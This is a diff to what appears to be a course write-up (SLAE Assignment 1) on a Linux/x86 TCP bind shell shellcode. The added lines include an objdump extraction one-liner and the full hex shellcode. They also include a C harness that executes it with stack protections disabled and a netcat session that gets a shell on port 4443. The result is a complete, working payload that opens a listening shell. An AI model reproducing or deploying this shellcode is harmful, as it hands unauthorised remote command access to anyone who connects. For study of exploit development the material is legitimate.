@@ -293,7 +293,6 @@ mov ebx, esp     ;pointer to args
 int 0x80         ;syscall
 ```
 This is the final code:
-
 ```nasm
 ; SLAE Assignment 1: Shell Bind TCP Shellcode (Linux/x86)
 ; Author:  4p0cryph0n
@@ -373,3 +372,44 @@ _start:
         mov ebx, esp     ;pointer to args
         int 0x80         ;syscall
 ```
+
+Let's extract the shellcode and test it out using ```shellcode.c```:
+```
+$ objdump -d ./shellcode_tcp_bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x11\x5b\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+```
+We paste this in ```shellcode.c```:
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x11\x5b\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+Now lets compile it, and test it out:
+```
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode           
+shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+    6 | main()
+      | ^~~~
+$ ./shellcode
+Shellcode Length:  102
+
+In another terminal:
+
+$ nc -nv 127.0.0.1 4443
+(UNKNOWN) [127.0.0.1] 4443 (?) open
+uname -a
+Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
+```
+Boom! it works :)
